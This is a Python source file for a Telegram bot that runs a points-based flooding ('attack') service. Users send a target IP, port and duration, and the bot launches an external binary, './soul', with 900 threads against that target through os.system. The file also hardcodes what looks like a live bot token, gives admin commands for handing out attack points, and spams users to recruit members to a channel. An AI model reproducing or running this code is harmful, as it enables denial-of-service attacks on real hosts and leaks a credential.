import os
import telebot
import logging
import asyncio
from threading import Thread

TOKEN = "7905527454:AAFU6FfZUXKYzShaiUAxAo1_ZNHGHTqzjww"
ADMIN_ID = 6207079474  # Replace with your actual admin user ID

bot = telebot.TeleBot(TOKEN)

user_permissions = {}  # Dictionary to store user access status
user_points = {}  # Store points for each user
attack_in_progress = False  # Flag to check if an attack is running

# Start command (when a user starts the bot)
@bot.message_handler(commands=['start'])
def handle_start(message):
    user_id = message.from_user.id

    if message.chat.type == 'private':
        if user_id not in user_points or user_points[user_id] == 0:
            bot.send_message(message.chat.id, "❗ You can't use this bot until you get points from the admin. Please DM the admin @samy784 to get points.")
            return
        else:
            bot.send_message(message.chat.id, f"🎉 You have {user_points[user_id]} points. To start an attack, send IP, Port, and Duration.\n🙏 Example format: `167.67.25 6296 100`")
            return

    # If it's a group, grant access and show points
    if user_id not in user_permissions:
        user_permissions[user_id] = 'approved'
        user_points[user_id] = 5  # Default 5 points for new users
        bot.send_message(message.chat.id, f"🎉 You have been granted access! You have {user_points[user_id]} points. To start an attack, send IP, Port, and Duration.\n🙏 Example format: `167.67.25 6296 100`")

# Admin adds points to a user
@bot.message_handler(commands=['addpoint'])
def add_points(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.send_message(message.chat.id, "⚠️ You are not an admin! Only the admin can add points. Please contact the admin @samy784.")
        return

    try:
        target_user_id, points_to_add = map(int, message.text.split()[1:])
        if target_user_id in user_points:
            user_points[target_user_id] += points_to_add
        else:
            user_points[target_user_id] = points_to_add
        bot.send_message(target_user_id, f"🎉 You have been granted {points_to_add} points. You now have {user_points[target_user_id]} points.")
        bot.send_message(message.chat.id, f"User {target_user_id} has been granted {points_to_add} points.")
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "❗ Please provide a valid user ID and points. Example: /addpoint 123456789 10")

# Admin adds points to all users in the group
@bot.message_handler(commands=['addpointall'])
def add_points_to_all(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.send_message(message.chat.id, "⚠️ You are not an admin! Only the admin can add points to everyone.")
        return

    try:
        points_to_add = int(message.text.split()[1])
        for user in user_permissions:
            if user in user_points:
                user_points[user] += points_to_add
            else:
                user_points[user] = points_to_add
            bot.send_message(user, f"🎉 You have been granted {points_to_add} points. You now have {user_points[user]} points.")
        bot.send_message(message.chat.id, f"Successfully added {points_to_add} points to all users.")
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "❗ Please provide a valid number of points.\nExample: /addpointall 10")

# Admin checks all users' points
@bot.message_handler(commands=['checkallpoints'])
def check_all_points(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.send_message(message.chat.id, "⚠️ You are not an admin! Only the admin can check all users' points.")
        return

    if not user_points:
        bot.send_message(message.chat.id, "❗ No users have points assigned yet.")
        return

    points_report = "📊 Points of all users:\n"
    for user_id, points in user_points.items():
        user = bot.get_chat(user_id)
        points_report += f"👤 {user.first_name} (ID: {user_id}): {points} points\n"

    bot.send_message(message.chat.id, points_report)

# Handle attack command (IP, Port, Duration)
@bot.message_handler(func=lambda message: user_permissions.get(message.from_user.id) == 'approved')
def handle_attack_command(message):
    global attack_in_progress
    user_id = message.from_user.id
    if attack_in_progress:
        bot.send_message(message.chat.id, "⚠️ An attack is currently in progress. Please try again later.")
        return

    if user_points.get(user_id, 0) == 0:
        bot.send_message(message.chat.id, "❗ You have no points left. Please contact the admin @samy784 to get more points.")
        return

    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.send_message(message.chat.id, "❗ Please send the correct format: IP Port Duration\nExample: `167.67.25 6296 100`.")
            return

        target_ip, target_port, duration = parts
        target_port = int(target_port)
        duration = int(duration)
        
        # Set the default number of threads to 900
        threads = 900

        # Check for valid IP format
        if not target_ip.replace('.', '').isdigit() or target_ip.count('.') != 3:
            bot.send_message(message.chat.id, "❗ Invalid IP address format. Please provide a valid IP.")
            return

        if duration > 100:
            bot.send_message(message.chat.id, "❗ The maximum attack duration is 100 seconds. Please provide a shorter duration.")
            return

        # Start the attack
        attack_in_progress = True
        bot.send_message(message.chat.id, f"🚀 Attack in process!\nTarget IP: {target_ip}\nTarget Port: {target_port}\nDuration: {duration} seconds with {threads} threads.")

        # Execute the attack using the `./soul` command (similar to second file)
        attack_command = f"./soul {target_ip} {target_port} {duration} {threads}"
        os.system(attack_command)

        # Decrease points after attack completion
        user_points[user_id] -= 1
        attack_in_progress = False
        bot.send_message(message.chat.id, f"🎉 Attack completed! You now have {user_points[user_id]} points remaining.\nFor more points, please contact the admin @samy784.")

    except ValueError:
        bot.send_message(message.chat.id, "❗ Port and Duration must be numeric values. Please provide valid inputs.")
    except Exception as e:
        bot.send_message(message.chat.id, "❗ Something went wrong. Please try again later.")
        attack_in_progress = False

# Automatic reminder every 10 minutes (Fixed with async/await)
async def send_10_minute_reminder():
    while True:
        await asyncio.sleep(600)  # Wait for 10 minutes (600 seconds)
        for user_id in user_permissions:
            bot.send_message(user_id, "📢 **Reminder:** If you want more points, join our channel, provide feedback, and add as many people as you can to the channel.\n👉 Join the channel: [https://t.me/l4dwale]\n⚠️ Once you’ve done that, contact the admin @samy784 to get more points.")

# Run the bot
def start_asyncio_thread():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.create_task(send_10_minute_reminder())  # Create the task for sending reminders
    loop.run_forever()

if __name__ == '__main__':
    Thread(target=start_asyncio_thread).start()
    bot.infinity_polling()
